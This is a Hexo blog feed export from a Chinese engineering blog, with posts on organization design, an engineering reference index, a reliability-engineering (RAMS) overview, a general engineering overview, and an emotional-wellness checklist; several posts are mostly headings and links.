    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><h2 id="Organization-Theory"><a href="#Organization-Theory" class="headerlink" title="Organization Theory"></a>Organization Theory</h2><h2 id="Organization-Design"><a href="#Organization-Design" class="headerlink" title="Organization Design"></a>Organization Design</h2><h4 id="个体层面-Individual-level"><a href="#个体层面-Individual-level" class="headerlink" title="个体层面 Individual level"></a>个体层面 Individual level</h4><h4 id="群体层面-Group-level"><a href="#群体层面-Group-level" class="headerlink" title="群体层面 Group level"></a>群体层面 Group level</h4><h4 id="项目层面-Project-level"><a href="#项目层面-Project-level" class="headerlink" title="项目层面 Project level"></a>项目层面 Project level</h4><h4 id="组织场域层面-Organizational-field-level"><a href="#组织场域层面-Organizational-field-level" class="headerlink" title="组织场域层面 Organizational field level"></a>组织场域层面 Organizational field level</h4><h2 id="Best-Practice-XX-最佳实践"><a href="#Best-Practice-XX-最佳实践" class="headerlink" title="Best Practice | XX 最佳实践"></a>Best Practice | XX 最佳实践</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/gTmqckbGIlzG0740bIO-lA" target="_blank" rel="noopener">重大工程组织行为学：理论框架及研究方向 |复杂工程视点  2019年4月15日</a></li>
<li><a href="https://mp.weixin.qq.com/s/3gCnHojNmU4Nk419IHSSlA" target="_blank" rel="noopener">管理暴力： 美军组织结构与设计思想 | 知远战略与防务研究所  2018-07-09 李健</a></li>
<li><a href="https://mp.weixin.qq.com/s/ogc87zZ5TfaMeo9bXDTDWQ" target="_blank" rel="noopener">尖牙利爪： 美国陆军旅战斗队通用编制与装备 | 知远战略与防务研究所  2018-05-15 李健</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
        <tag>Policy</tag>
      </tags>
  </entry>
  <entry>
    <title>Engineering Index</title>
    <url>/2018/09/11/Engineering-Index/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>工程技术文献索引汇编</p>
<span id="more"></span>
<h2 id="Psychology"><a href="#Psychology" class="headerlink" title="Psychology"></a>Psychology</h2><ul>
<li><a href="https://www.psychologytoday.com">Psychology Today</a></li>
</ul>
<h2 id="Machine-Learning"><a href="#Machine-Learning" class="headerlink" title="Machine Learning"></a>Machine Learning</h2><ul>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Articles/">Machine Learning Articles</a></li>
<li><a href="http://download.tensorflow.org/paper/whitepaper2015.pdf">TensorFlow:Large-Scale Machine Learning on Heterogeneous Distributed Systems (Preliminary White Paper, November 9, 2015)</a></li>
</ul>
<h2 id="Design"><a href="#Design" class="headerlink" title="Design"></a>Design</h2><ul>
<li><a href="https://static.googleusercontent.com/media/research.google.com/zh-CN//archive/mapreduce-osdi04.pdf">MapReduce: Simplified Data Processing on Large Clusters</a></li>
</ul>
<h2 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h2><ul>
<li><a href="https://www.devdungeon.com/content/packet-capture-injection-and-analysis-gopacket">Packet Capture, Injection, and Analysis with Gopacket</a></li>
</ul>
<h2 id="Perf"><a href="#Perf" class="headerlink" title="Perf"></a>Perf</h2><ul>
<li><a href="https://medium.com/netflix-techblog/linux-performance-analysis-in-60-000-milliseconds-accc10403c55">Linux Performance Analysis in 60,000 Milliseconds</a></li>
<li><a href="https://static.googleusercontent.com/media/research.google.com/zh-CN//archive/papers/dapper-2010-1.pdf">《Dapper, a Large-Scale Distributed Systems Tracing Infrastructure|Google Technical Report dapper-2010-1, April 2010》</a></li>
</ul>
<h2 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h2><ul>
<li><a href="https://opensource.com/article/17/10/10-layers-container-security">10 layers of Linux container security</a></li>
</ul>
<h2 id="Networking"><a href="#Networking" class="headerlink" title="Networking"></a>Networking</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/12/Protocol-RFC/">RFC</a></li>
<li><a href="http://yuba.stanford.edu/~casado/mcthesis.pdf">ARCHITECTURAL SUPPORT FOR SECURITY MANAGEMENT IN ENTERPRISE NETWORKS</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>可靠性工程 | Overview of Reliability</title>
    <url>/2020/01/02/Engineering-RAMS/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>RAMS 即可靠性(Reliability)、可用性(Availability)、可维护性(Maintainability) 和安全性(Safety)的简称。</p>
<span id="more"></span>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>RAMS 即可靠性(Reliability)、可用性(Availability)、可维护性(Maintainability) 和安全性(Safety)的简称。</p>
<h4 id="History"><a href="#History" class="headerlink" title="History"></a>History</h4><h5 id="西北欧工业事故"><a href="#西北欧工业事故" class="headerlink" title="西北欧工业事故"></a>西北欧工业事故</h5><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h4 id="失效-vs-故障-vs-误差"><a href="#失效-vs-故障-vs-误差" class="headerlink" title="失效 vs 故障 vs 误差"></a>失效 vs 故障 vs 误差</h4><p>定义：IEC50(1990)</p>
<h5 id="失效（Failures）"><a href="#失效（Failures）" class="headerlink" title="失效（Failures）"></a>失效（Failures）</h5><p>失效（Failures）定义，当产品单元的规定功能不能完成时（超过可接受范围），产品单元发生失效。</p>
<h5 id="故障（Faults）"><a href="#故障（Faults）" class="headerlink" title="故障（Faults）"></a>故障（Faults）</h5><p>故障（Faults）是指没有能力完成规定功能时产品单元的状态，这种状态不包括在预防性维修和定时维修时产品不能工作的状态，也不包括缺少外部资源引起不能工作的状态。</p>
<h5 id="误差（Errors）"><a href="#误差（Errors）" class="headerlink" title="误差（Errors）"></a>误差（Errors）</h5><h4 id="Best-Practice-可靠性理论最佳实践"><a href="#Best-Practice-可靠性理论最佳实践" class="headerlink" title="Best Practice 可靠性理论最佳实践"></a>Best Practice 可靠性理论最佳实践</h4><ul>
<li>可靠性设计</li>
<li>安全性设计</li>
<li>风险评估</li>
<li>工艺管理与控制</li>
<li>成熟度</li>
</ul>
<h2 id="Best-Practice-可靠性理论最佳实践：失效分析"><a href="#Best-Practice-可靠性理论最佳实践：失效分析" class="headerlink" title="Best Practice | 可靠性理论最佳实践：失效分析"></a>Best Practice | 可靠性理论最佳实践：失效分析</h2><h2 id="Best-Practice-可靠性理论最佳实践：可靠性设计"><a href="#Best-Practice-可靠性理论最佳实践：可靠性设计" class="headerlink" title="Best Practice | 可靠性理论最佳实践：可靠性设计"></a>Best Practice | 可靠性理论最佳实践：可靠性设计</h2><h2 id="Best-Practice-可靠性理论最佳实践：安全性设计"><a href="#Best-Practice-可靠性理论最佳实践：安全性设计" class="headerlink" title="Best Practice | 可靠性理论最佳实践：安全性设计"></a>Best Practice | 可靠性理论最佳实践：安全性设计</h2><h2 id="Best-Practice-可靠性理论最佳实践：风险评估"><a href="#Best-Practice-可靠性理论最佳实践：风险评估" class="headerlink" title="Best Practice | 可靠性理论最佳实践：风险评估"></a>Best Practice | 可靠性理论最佳实践：风险评估</h2><h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><h4 id="NTNU-PPT"><a href="#NTNU-PPT" class="headerlink" title="NTNU PPT"></a>NTNU PPT</h4><ul>
<li><a href="https://www.ntnu.edu/ross/books/srt/slides">《System Reliability Theory》PPT</a></li>
<li><a href="https://www.ntnu.edu/ross/books/sis/slides">《Reliability of Safety-Critical Systems》PPT</a></li>
<li><a href="https://www.ntnu.edu/ross/slides-risk">《Risk Assessmen: Theory, Methods, and Applications》PPT</a></li>
<li><a href="https://www.ntnu.edu/ross/books/risikoanalyse/lysark">《Risikoanalyse. Teori og metoder》PPT</a></li>
</ul>
<h4 id="《风险评估：理论、方法与应用》"><a href="#《风险评估：理论、方法与应用》" class="headerlink" title="《风险评估：理论、方法与应用》"></a>《风险评估：理论、方法与应用》</h4><p><a href="http://www.tup.com.cn/bookscenter/preface.html?id=04576801">《风险评估：理论、方法与应用》简介</a></p>
<p>西方发达国家，尤其是西北欧国家，在经历了20世纪70年代和80年代一系列惨痛的工业事故之后，就一直把工业安全和事故预防的问题放在重中之重的地位，并大范围推广风险评估技术和方法，也对此进行了大量的探索和研究。所有的这些成果都会对解决中国日益严重的技术安全问题有巨大的帮助。</p>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><h4 id="研究机构"><a href="#研究机构" class="headerlink" title="研究机构"></a>研究机构</h4><h5 id="挪威科技大学-Norwegian-University-of-Science-and-Technology，简称-NTNU"><a href="#挪威科技大学-Norwegian-University-of-Science-and-Technology，简称-NTNU" class="headerlink" title="挪威科技大学(Norwegian University of Science and Technology，简称 NTNU)"></a>挪威科技大学(Norwegian University of Science and Technology，简称 NTNU)</h5><p><a href="https://zh.wikipedia.org/wiki/%E6%8C%AA%E5%A8%81%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%B8">挪威科技大学</a>是挪威工程学与工业技术的研究中心。为挪威及世界各地区培养了大批量的高素质工程师，造船，石油，渔业，医学，计算机技术及纳米技术学科属于世界顶尖，曾有五位校友获得诺贝尔奖；挪威科技大学最早历史可以追溯到1760年成立的特隆赫姆学会，该学会于1767年受到挪威皇室的认可，进而改名为挪威皇家科学与文学学会，1996年，挪威理工学院与特隆赫姆艺术科学学院、自然历史和考古博物馆合并组成挪威科技大学。</p>
<h4 id="中国北方车辆研究所-中国兵器201所"><a href="#中国北方车辆研究所-中国兵器201所" class="headerlink" title="中国北方车辆研究所(中国兵器201所)"></a>中国北方车辆研究所(中国兵器201所)</h4><p>中国坦克装甲车辆总体研制单位和兵器地面无人平台研发中心。</p>
<h4 id="部分研究者"><a href="#部分研究者" class="headerlink" title="部分研究者"></a>部分研究者</h4><ul>
<li><a href="https://www.ntnu.edu/employees/marvin.rausand">挪威科技大学 Marvin Rausand 教授/马文·拉桑德</a></li>
</ul>
<p><img src="https://sats.itea.ntnu.no/user-profile-service/rest/files/d8fcd503-854f-3d49-b475-ecf027d405fe" alt=""></p>
<p><strong>Competence/interests:</strong></p>
<ul>
<li>System reliability theory</li>
<li>Reliability, Availability, Maintainability, and Safety (RAMS) analysis</li>
<li>Risk analysis</li>
<li>Reliability Centered Maintenance (RCM)</li>
<li>Reliability assessment of oil/gas subsea and well equipment</li>
<li>Probabilistic modeling</li>
</ul>
<p><strong>Books:</strong></p>
<ul>
<li>Rausand, M.: “Reliability of Safety-Critical Systems: Theory and Applications,” Wiley, Hoboken, NJ ,2014.</li>
<li>Rausand, M.: “Risk Assessment: Theory, Methods, and Applications,”  Wiley, Hoboken, 2011.<br>[This book has been translated to Chinese and is published by Tsinghua University Press, 2013]</li>
<li>Rausand, M. and Utne, I. B.: “Risikoanalyse - Teori og metoder”, Tapir akademisk forlag, Trondheim, 2009 (In Norwegian).</li>
<li>Murthy, D. N. P., Rausand, M. and Østerås, T.: “Product Reliability: Specification and Performance”, Springer, London, 2008.<br>[This book is currently (i.e., 2013) being translated to Chinese.]</li>
<li><p>Rausand, M. and Høyland, A.: “System Reliability Theory: Models, Statistical methods, and Applications” (2nd ed.), Wiley, Hoboken, 2004.  [This book has been translated to Chinese and is published by the National Defense Industry Press, 2010]</p>
</li>
<li><p><a href="https://wqbook.wqxuetang.com/book/9197.html">挪威科技大学 刘一骝 副教授</a></p>
</li>
<li><p><a href="http://info.ruc.edu.cn/news_convert_detail.php?id=735">挪威科技大学 Arvid Naess 教授</a><br>研究兴趣主要包括数理统计、极值概率、可靠性理论、海洋波统计、民用工程等。</p>
</li>
<li><p><a href="https://person.zju.edu.cn/jinwl#585691">浙江大学建筑工程学院/金伟良教授</a><br>研究方向：工程结构可靠度、混凝土结构基本性能（含耐久性、长期性能）</p>
</li>
<li><p><a href="http://www.smee.uestc.edu.cn/info/1106/8736.htm">电子科技大学机电学院/黄洪钟教授</a><br>研究方向：1. 可靠性设计；2. 状态监测、故障诊断与寿命预测；3. 人工智能与优化设计；4. 数字化设计与智能制造</p>
</li>
<li><p><a href="http://www.cutech.edu.cn/cn/rootfiles/2016/01/04/1451863628564355-1451863628788842.pdf">东北大学张义民教授</a><br>提出了机械装备的动态和渐变可靠性设计、可靠性优化设计、可靠性灵敏度设计和可靠性稳健设计等成组理论与技术等，应用于压缩机、车辆、重矿机械、机床、发动机等行业。</p>
</li>
</ul>
<h4 id="资质认证"><a href="#资质认证" class="headerlink" title="资质认证"></a>资质认证</h4><ul>
<li><p>ASQ CRE：美国ASQ的注册可靠性工程师认证。</p>
</li>
<li><p>TÜV Functional Safety：德国TÜV的功能安全认证。<br>包括：</p>
</li>
<li>南德 Functional Safety Certified Professional</li>
<li>北德 Functional Safety Certified Engineer/Coordinator/Manager</li>
<li><p>莱茵 Functional Safety Engineer</p>
</li>
<li><p>INCOSE ASEP/CSEP/ESEP：美国INCOSE的系统工程师认证。</p>
</li>
</ul>
<h4 id="专业组织"><a href="#专业组织" class="headerlink" title="专业组织"></a>专业组织</h4><ul>
<li>IEEE Reliability Society：IEEE 可靠性分会。</li>
<li><p>ASQ Reliability Division：<br>英文详见 <a href="http://www.asqrd.org">http://www.asqrd.org</a><br>中文详见 <a href="https://accendoreliability.com/webinars">https://accendoreliability.com/webinars</a></p>
</li>
<li><p>INCOSE：涵盖了系统工程的多方面内容，有时会跟RAMS有交集。</p>
</li>
</ul>
<h4 id="学术会议"><a href="#学术会议" class="headerlink" title="学术会议"></a>学术会议</h4><h5 id="ESREL（European-Safety-and-Reliability-Conference，欧洲安全性和可靠性会议）"><a href="#ESREL（European-Safety-and-Reliability-Conference，欧洲安全性和可靠性会议）" class="headerlink" title="ESREL（European Safety and Reliability Conference，欧洲安全性和可靠性会议）"></a>ESREL（European Safety and Reliability Conference，欧洲安全性和可靠性会议）</h5><p>2018年6月在挪威特隆赫姆（Trondheim）举行，由挪威科技大学（NTNU）承办。ESREL 2018 会议的主题是“不断变化的世界中的安全社会”。会议目标是推动理解，建模、分析并管理在风险，安全和可靠性领域的复杂性问题，这些领域体现在我们世界的现在和未来。并寻求建立一个多学科平台，以解决这些领域的技术，社会等问题。</p>
<h5 id="RAMS"><a href="#RAMS" class="headerlink" title="RAMS"></a>RAMS</h5><p>RAMS领域的年度盛会。2018年1月在美国内华达州（Nevada）举行。</p>
<h5 id="ICRSE（International-Conference-on-Reliability-Systems-Engineering，国际可靠性系统工程会议）"><a href="#ICRSE（International-Conference-on-Reliability-Systems-Engineering，国际可靠性系统工程会议）" class="headerlink" title="ICRSE（International Conference on Reliability Systems Engineering，国际可靠性系统工程会议）"></a>ICRSE（International Conference on Reliability Systems Engineering，国际可靠性系统工程会议）</h5><p>2017年7月中旬在北京举行，由北京航空航天大学承办。</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/fgqENDVqDEBjw6Du4zxd3A">头条丨国家核安全局通报秦山核电厂1号机组停堆运行事件</a></li>
<li><a href="https://mp.weixin.qq.com/s/-tn22odjQJc3XC2qmQi5UA">京广线列车脱轨事故原因公布：司机瞭望距离不足，停车不及撞上滑坡山体</a></li>
<li><a href="https://wxa12e8f0b2163cec2.h5.xiaoe-tech.com/v1/course/column/p_5ea2ed8bd2a5b_yJBLRe5F?type=3&amp;share_user_id=u_5ea90589d779d_9b01s4MytH&amp;share_type=2&amp;scene=%E5%88%86%E4%BA%AB&amp;entry=2&amp;entry_type=2001&amp;is_redirect=1">深思：江西丰城电厂三期EPC特大事故</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.norincogroup.com.cn/col/col193/index.html">中国兵器工业集团</a></li>
<li><a href="http://www.norincogroup.com.cn/art/2019/2/19/art_186_148836.html">记全国技术能手、中国兵器北重集团数控设备维修领域人才李松</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28113211">RAMS工程师职业发展的个人建议</a></li>
<li><a href="https://em.swjtu.edu.cn/info/1023/3211.htm">挪威科技大学刘一骝教授到计算机与通信工程系访问</a></li>
<li><a href="https://mp.weixin.qq.com/s/x6moXLAkd3dAZTvzZ9zKQw">南方电网公司反事故措施（2020版）</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Policy</tag>
      </tags>
  </entry>
  <entry>
    <title>工程学 | Overview of Engineering</title>
    <url>/2019/01/07/Engineering/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="Introduction-to-Engineering"><a href="#Introduction-to-Engineering" class="headerlink" title="Introduction to Engineering"></a>Introduction to Engineering</h2><p>工程学是指将知识（通常是科学，数学和经验）应用于结构，机器，材料，设备，系统，过程和组织的创新，设计，构造，操作和维护。</p>
<blockquote>
<p>The activity of applying scientific knowledge to the design, building, and control of machines,roads, bridges, electrical equipment,etc. ——《牛津英语词典》</p>
<p>Engineering is the application of knowledge, typically in the form of science, mathematics, and empirical evidence, to the innovation, design, construction, operation and maintenance of structures, machines, materials, devices, systems, processes, and organizations. —— Wiki</p>
</blockquote>
<h2 id="创新"><a href="#创新" class="headerlink" title="创新"></a>创新</h2><h2 id="工程设计"><a href="#工程设计" class="headerlink" title="工程设计"></a>工程设计</h2><h3 id="RAMS"><a href="#RAMS" class="headerlink" title="RAMS"></a>RAMS</h3><p>RAMS 即可靠性(Reliability)、可用性(Availability)、可维护性(Maintainability) 和安全性(Safety)的简称。</p>
<h5 id="可靠性工程-Overview-of-Reliability"><a href="#可靠性工程-Overview-of-Reliability" class="headerlink" title="可靠性工程 | Overview of Reliability"></a><a href="https://riboseyim.github.io/2020/01/02/Engineering-RAMS/">可靠性工程 | Overview of Reliability</a></h5><ul>
<li>失效分析</li>
<li>可靠性设计</li>
<li>安全性设计</li>
<li>风险评估</li>
</ul>
<p>未分类：</p>
<ul>
<li><a href="https://riboseyim.github.io/2019/01/01/Engineering-DisasterRecovery/">工程设计：容灾</a></li>
</ul>
<h2 id="工程组织"><a href="#工程组织" class="headerlink" title="工程组织"></a>工程组织</h2><ul>
<li>组织理论与设计</li>
</ul>
<h2 id="工程伦理"><a href="#工程伦理" class="headerlink" title="工程伦理"></a>工程伦理</h2><ul>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
</ul>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h4 id="个人生产力"><a href="#个人生产力" class="headerlink" title="个人生产力"></a>个人生产力</h4><ul>
<li><a href="https://riboseyim.github.io/2016/04/26/Tools/">场景化过程改进之个人效率提升</a></li>
</ul>
<h4 id="软件工程领域"><a href="#软件工程领域" class="headerlink" title="软件工程领域"></a>软件工程领域</h4><ul>
<li>[ ] <a href="https://arxiv.org/ftp/arxiv/papers/1702/1702.01715.pdf">Software Engineering of Google</a></li>
<li><a href="https://riboseyim.com/2017/11/05/OpenSource-Operational/">开源软件的六大运营挑战</a></li>
<li><a href="https://riboseyim.com/2017/07/05/Law-Of-Engineering/">软件工程实践中的十大法则</a></li>
</ul>
<h4 id="网络工程领域"><a href="#网络工程领域" class="headerlink" title="网络工程领域"></a>网络工程领域</h4><h4 id="建筑工程领域"><a href="#建筑工程领域" class="headerlink" title="建筑工程领域"></a>建筑工程领域</h4><ul>
<li>[ ] <a href="https://riboseyim.github.io/2018/12/31/Engineering-Architecture/">《建筑的复杂性与矛盾性》</a></li>
<li>[ ] <a href="https://riboseyim.github.io/2018/12/31/Engineering-Architecture/">《图像中国建筑史》| 梁思成</a></li>
</ul>
<h4 id="交通工程领域"><a href="#交通工程领域" class="headerlink" title="交通工程领域"></a>交通工程领域</h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/">《明代的漕运》| 黄仁宇</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">挑战者号航天飞机事故调查</a></li>
<li><a href="https://riboseyim.com/2016/11/20/Network-Traffic/">珠海航展交通管控实践</a></li>
</ul>
<h4 id="艺术领域"><a href="#艺术领域" class="headerlink" title="艺术领域"></a>艺术领域</h4><ul>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
</ul>
<h2 id="Engineering-Resources"><a href="#Engineering-Resources" class="headerlink" title="Engineering Resources"></a>Engineering Resources</h2><ul>
<li><a href="https://riboseyim.com/2018/09/15/Engineering-Blog/">Engineering Blog</a></li>
<li><a href="https://riboseyim.com/2018/09/11/Engineering-Index/">Engineering Index</a></li>
</ul>
<h2 id="阅读作业"><a href="#阅读作业" class="headerlink" title="阅读作业"></a>阅读作业</h2><h5 id="《工程思维-Design-Concepts-for-Engineers》"><a href="#《工程思维-Design-Concepts-for-Engineers》" class="headerlink" title="《工程思维 Design Concepts for Engineers》"></a>《工程思维 Design Concepts for Engineers》</h5><ul>
<li>作者：马克 N.霍伦斯坦(Mark N.Horenstein)，</li>
<li>翻译：宫晓利/南开大学 张金/南开大学 赵子平/天津师范大学</li>
</ul>
<h5 id="《-To-Engineer-is-Human-The-Role-of-Failure-in-Successful-Design-1985-》-Henry-Petroski"><a href="#《-To-Engineer-is-Human-The-Role-of-Failure-in-Successful-Design-1985-》-Henry-Petroski" class="headerlink" title="《 To Engineer is Human: The Role of Failure in Successful Design (1985)》|Henry Petroski"></a>《 To Engineer is Human: The Role of Failure in Successful Design (1985)》|<a href="https://en.wikipedia.org/wiki/Henry_Petroski">Henry Petroski</a></h5><h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.github.io/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://hackaday.com/2019/06/11/a-field-guide-to-transmission-lines/">A FIELD GUIDE TO TRANSMISSION LINES | 电力传输网络</a></li>
<li><a href="https://mp.weixin.qq.com/s/r9nDA1ym4TlFz_KFHYGy8Q">世界最长十大隧道|中科院地质地球所</a></li>
<li><a href="https://mp.weixin.qq.com/s/DARjQ8p9-8FzRA7SLeCkWA">力学与工程：一名优秀的工程师首先是力学家 | 声振之家  2018-06-11</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>医学常识|情绪健康检查表</title>
    <url>/2018/01/22/Health-Emotional/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>情绪健康检查表</li>
<li>Emotional Wellness Checklist</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Work Life Balance</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2017/04/21/Health/">IT 工程师养生指南</a></li>
<li><a href="https://riboseyim.github.io/2018/01/22/Health-Emotional/">医学常识| NIH 情绪健康检查单</a></li>
</ul>
<h2 id="Preview"><a href="#Preview" class="headerlink" title="Preview"></a>Preview</h2><ul>
<li><a href="https://www.psychologytoday.com/blog/think-act-be/201710/how-helping-others-can-relieve-anxiety-and-depression">How Helping Others Can Relieve Anxiety and Depression |New research shows one more way that compassion is beneficial.|Posted Oct 10, 2017</a><br>compassionate goals were associated with lower levels of symptoms and less relationship conflict.</li>
</ul>
<h2 id="情绪健康检查表"><a href="#情绪健康检查表" class="headerlink" title="情绪健康检查表"></a>情绪健康检查表</h2><blockquote>
<p>Emotional wellness is the ability to successfully handle life’s stresses and adapt to change and difficult times.</p>
</blockquote>
<p>情绪健康是成功地处理生活压力和适应变化和困难时期的能力。</p>
<h4 id="前景乐观"><a href="#前景乐观" class="headerlink" title="前景乐观"></a><strong>前景乐观</strong></h4><p>专家说，情绪健康的人消极情绪少，能更快地从困难中恢复过来。这种品质叫做弹性（ resilience ）。情绪健康的另一个标志是能够持久保持积极情绪、欣赏美好时光。</p>
<p>培养更积极的心态：</p>
<ul>
<li>记住你的善行。</li>
<li>原谅你自己。</li>
<li>多花点时间和朋友在一起。</li>
<li>探索你对人生意义和人生目标的信念。</li>
<li>养成健康的生活习惯。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/illustration-hiker-watching-sunset-2.jpg" alt=""></p>
<h4 id="减少压力"><a href="#减少压力" class="headerlink" title="减少压力"></a><strong>减少压力</strong></h4><p>每个人都不时感到压力。压力会在你最需要的时候给你一股能量。但是，如果压力持续很长一段时间被称为慢性应激，“高度警惕”的变化变得有害无益。学习应对压力的方法也能增强你的韧性。</p>
<p>管理你的压力:</p>
<ul>
<li>充足的睡眠。</li>
<li>经常锻炼。</li>
<li>建立一个社会支持网络。</li>
<li>设置优先级。</li>
<li>积极思考。</li>
<li>尝试放松。</li>
<li>寻求帮助。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/illustration-adults-winter-lodge-2.jpg" alt=""></p>
<h4 id="提高睡眠质量"><a href="#提高睡眠质量" class="headerlink" title="提高睡眠质量"></a><strong>提高睡眠质量</strong></h4><p>为了完成我们今天想做的每一件事，我们经常牺牲睡眠。但是睡眠对身心健康都有影响。这一点对你的幸福至关重要。当你处于疲劳状态的时候不能发挥最佳效能。睡眠有助于你更清晰地思考，更快的反应和更好的集中注意力。采取措施确保你有规律的睡个好觉。</p>
<p>获得更好的睡眠质量：</p>
<ul>
<li>每天按时上床睡觉 &amp; 起床。</li>
<li>在黑暗、安静的地方睡觉。</li>
<li>每天锻炼。</li>
<li>限制使用电子产品。</li>
<li>睡前放松。</li>
<li>避免在白天晚些时候饮酒、吸烟和刺激物质。</li>
<li>如果你有持续的睡眠问题请咨询健康专家。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/illustration-man-arising-bed.jpg" alt=""></p>
<h4 id="正念"><a href="#正念" class="headerlink" title="正念"></a><strong>正念</strong></h4><p>正念的概念很简单。这个古老的实践是关于完全意识到正在发生的一切，内在的一切和周围发生的一切。这意味着不要把生活当成“自动驾驶”，成为一个更加用心的人需要承诺和实践。下面是一些帮助你入门的技巧。</p>
<h4 id="To-be-more-mindful："><a href="#To-be-more-mindful：" class="headerlink" title="To be more mindful："></a>To be more mindful：</h4><ul>
<li>用鼻子深呼吸，数到4，保持1秒钟，然后通过嘴呼气数到5。经常重复。</li>
<li>漫步，留心、欣赏周围的风景。</li>
<li>练习正念饮食。用心去体会对食物的渴望，进食时身体的感觉。</li>
<li>在你的本地社区找到正念资源，包括课程、计划或书籍。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/illustration-computer-window-tree-bird-2.jpg" alt=""></p>
<h4 id="应对亲人-爱人逝去"><a href="#应对亲人-爱人逝去" class="headerlink" title="应对亲人/爱人逝去"></a><strong>应对亲人/爱人逝去</strong></h4><p>当你所爱的人死了，你的世界就会改变。没有绝对正确或错误的悼念方式。虽然亲人的去世会让人感到难以忍受，但大多数人都能在家人和朋友的支持下度过悲痛的过程。学习一些健康的方法帮助你度过困难时期。</p>
<p>以下措施有助于应对爱人逝去：</p>
<ul>
<li>照顾好自己。</li>
<li>和一个关心你的朋友谈谈。</li>
<li>不要马上做任何重大的改变。</li>
<li>加入悲伤支持小组。</li>
<li>考虑专业支持。</li>
<li>如果你在日常活动中遇到困难，可以和你的医生谈谈。</li>
<li>耐心点。度过悲痛需要时间。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/illustration-sports-fans-planning-2.jpg" alt=""></p>
